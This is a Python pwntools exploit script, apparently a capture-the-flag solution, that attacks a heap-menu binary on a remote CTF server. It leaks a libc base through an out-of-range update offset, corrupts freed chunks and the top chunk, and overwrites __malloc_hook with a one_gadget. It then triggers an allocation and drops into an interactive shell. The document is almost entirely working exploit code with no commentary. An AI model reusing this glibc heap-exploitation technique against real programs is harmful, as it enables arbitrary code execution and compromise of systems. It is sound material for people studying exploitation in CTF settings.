from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./pwn')
else:
	p = remote('8sdafgh.gamectf.com', 10001)

def add(idx, content):
	p.recvuntil('5.Exit')
	p.sendline('1')
	p.recvuntil('3.Large')
	p.sendline(str(idx))
	p.recvuntil('Content:')
	p.send(content)

def update(idx, offset, content):
	p.recvuntil('5.Exit')
	p.sendline('2')
	p.recvuntil('Which one do you want to update?')
	p.sendline(str(idx))
	p.recvuntil('Where you want to update?')
	p.sendline(str(offset))
	p.recvuntil('Input Content:')
	p.send(content)

def delete(idx):
	p.recvuntil('5.Exit')
	p.sendline('3')
	p.recvuntil('Which one do you want to delete?')
	p.sendline(str(idx))

def view(idx):
	p.recvuntil('5.Exit')
	p.sendline('4')
	p.recvuntil('Which one do you want to view?')
	p.sendline(str(idx))

#gdb.attach(p)
#leak libc
add(2, 'kotori\n')#0
add(2, 'kotori\n')#1
add(3, 'kotori\n')#2
add(2, 'kotori\n')#3
add(2, 'kotori\n')#4
add(2, 'kotori\n')#5
update(1, 0x80000000, p64(0) * 3 + p64(0x111) + '\n')
delete(1)
add(2, '\n')#6
view(6)
p.recvline()
p.recvline()
libc_base = u64('\x00' + p.recvline()[:5].ljust(7, '\x00')) - 0x3c4c00
print hex(libc_base)

#malloc_hook
#fake head
add(3, 'kotori\n')#7
delete(7)
update(2, 0, p64(0x41) + '\n')
add(3, 'kotori\n')#8
target_addr = libc_base + 0x3c4b38
#change top chunk
add(2, 'kotori\n')#9
delete(9)
update(3, 0, p64(target_addr) + '\n')
add(2, 'kotori\n')#10
add(2, p64(0x41) * 6)#11
add(2, 'kotori\n')#12
delete(12)
update(4, 0, p64(target_addr + 0x20) + '\n')
add(2, 'kotori\n')#13
fake_top_chunk = libc_base + 0x3c4ae8
add(2, p64(0) * 2 + p64(fake_top_chunk) + '\n')#14
#malloc_hook
one_gadget = libc_base + 0xf1147 
add(1, p64(0) * 3 + p64(one_gadget))
p.recvuntil('5.Exit')
p.sendline('1')
p.recvuntil('3.Large')
p.sendline('1')

p.interactive()
